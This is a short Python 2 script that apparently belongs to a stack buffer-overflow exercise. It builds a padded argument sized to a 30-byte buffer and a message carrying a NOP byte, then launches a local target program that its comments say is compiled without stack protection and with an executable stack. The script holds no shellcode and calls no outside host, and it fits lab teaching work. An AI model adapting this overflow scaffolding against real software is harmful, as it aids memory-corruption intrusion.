#!/usr/bin/env python2

import subprocess
import sys
import os

def main(program):
    if not os.path.isfile(program):
        print("File '{}' does not exist".format(program))
        return

    g_prefix = "Hello! "
    g_suffix = "!!\n\0"
    g_size = 30
    g_extra = len(g_prefix) + len(g_suffix)
    user = "Q" * (g_size - g_extra)
    message = "message\x90"

    # Note: CFLAGS=-fno-stack-protector -zexecstack -g -w
    # - (no-stack-protector) allows stack to be modified
    # - (execstack) allows stack to be executable
    # - (g) gdb
    # - (w) suppress warnings

    print("Exploiting '{}':".format(program))
    print("------------{}--".format(len(program) * '-'))
    subprocess.Popen([program, user, message])


if __name__ == "__main__":
    main(sys.argv[1])